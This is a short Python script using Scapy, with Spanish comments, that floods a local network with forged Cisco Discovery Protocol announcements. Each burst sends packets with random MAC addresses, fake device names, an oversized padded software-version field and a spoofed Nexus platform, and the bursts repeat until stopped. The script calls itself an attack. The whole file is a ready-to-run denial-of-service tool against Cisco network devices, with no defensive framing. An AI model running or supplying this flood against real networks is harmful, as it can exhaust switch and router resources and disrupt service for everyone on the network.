from scapy.all import *
import time

# Cargamos la contribucion de CDP
load_contrib("cdp")

interface = "eth0" 


text = "*" 
e = 718

rep = (text + " ") * e
# Cantidad de dispositivos 
try:
    disp = int(input("Numero de dispositivos unicos: "))
except ValueError:
    print("Error: Ingresa un número entero.")
    exit()

def cdp_flood_infinito():
    print(f"--- Iniciando inundación CDP ---")
    print(f"Presiona Ctrl+C para detener el ataque.\n")
    
    rafaga_count = 1
    
    try:
        while True: # Bucle infinito de repeticion
            print(f"[*] Iniciando ráfaga #{rafaga_count}")
            
            for i in range(1, disp + 1):
                # Generamos nombres únicos 
                
                nombre_fake = f"SRV-VULN-{rafaga_count}-{i:03d}"
                
                pkt = (Ether(src=RandMAC(), dst="01:00:0c:cc:cc:cc") /
                       LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                       SNAP(OUI=0x00000c, code=0x2000) /
                       CDPv2_HDR() /
                       CDPMsgDeviceID(val=nombre_fake) /
                       CDPMsgPortID(iface=f"Eth{i % 48}") /
                       CDPMsgSoftwareVersion(val=rep) /
                       CDPMsgPlatform(val="Cisco Nexus 9000")) # Cambiamos el modelo 
                
                # Forzamos reconstruccion para Checksums
                pkt_final = Ether(raw(pkt))
                sendp(pkt_final, iface=interface, verbose=False)
            
            print(f"[+] Rafaga #{rafaga_count} completada ({disp} paquetes).")
            rafaga_count += 1
             
            
    except KeyboardInterrupt:
        print("\n[!] Inundacion detenida.")

if __name__ == "__main__":
    cdp_flood_infinito()
